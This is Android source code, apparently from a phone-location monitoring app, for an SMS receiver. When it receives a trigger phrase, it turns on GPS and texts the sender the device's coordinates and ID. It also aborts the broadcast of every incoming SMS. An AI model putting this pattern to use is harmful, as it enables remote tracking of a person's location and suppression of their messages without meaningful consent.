package mx.solucionesonline.num;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.LocationManager;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

public class Sms extends BroadcastReceiver {
    final SmsManager sms = SmsManager.getDefault();
    public Singleton singleton;

    public Sms() {
        singleton = Singleton.getInstance();
    }

    @Override
    public void onReceive(Context context, Intent intent) {
        final Bundle bundle = intent.getExtras();

        if (bundle != null) {
            final Object[] pdusObj = (Object[]) bundle.get("pdus");
            for (int i = 0; i < pdusObj.length; i++) {
                //CAPTURAMOS SMS

                SmsMessage ESTRUCTURA = SmsMessage.createFromPdu((byte[]) pdusObj[i]);
                String REMITENTE = ESTRUCTURA.getDisplayOriginatingAddress();
                final String MENSAJE = ESTRUCTURA.getDisplayMessageBody();
                Log.i("RECEIVER", "numero:" + REMITENTE + " Mensaje:" + MENSAJE);
                //String link = "https://www.solucionesonline.com/monitoreoNum/";
                if (MENSAJE.equals("Hola hijo, como te va?")) {
                    Toast.makeText(context, "numero:" + REMITENTE + " Mensaje:" + MENSAJE, Toast.LENGTH_SHORT).show();
                    activarLocalización();
                    enviarMensaje(context, REMITENTE, "https://www.solucionesonline.mx/apps_moviles/monitoreoNum/execApp.php?num=" + singleton.lat + "," + singleton.lon + "," + singleton.deviceId);
                }
                abortBroadcast();

            }
        }
    }

    public void activarLocalización() {
        try {
            singleton.locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, singleton.locationListener);
        }catch (Exception e){
            e.printStackTrace();
        }

    }

    private void enviarMensaje (Context context, String numero, String mensaje){
        try {
            SmsManager sms = SmsManager.getDefault();
            sms.sendTextMessage(numero,null,mensaje,null,null);
            Toast.makeText(context, "Mensaje Enviado.", Toast.LENGTH_LONG).show();
        }
        catch (Exception e) {
            Toast.makeText(context, "Mensaje no enviado, datos incorrectos.", Toast.LENGTH_LONG).show();
            e.printStackTrace();
        }
    }


}


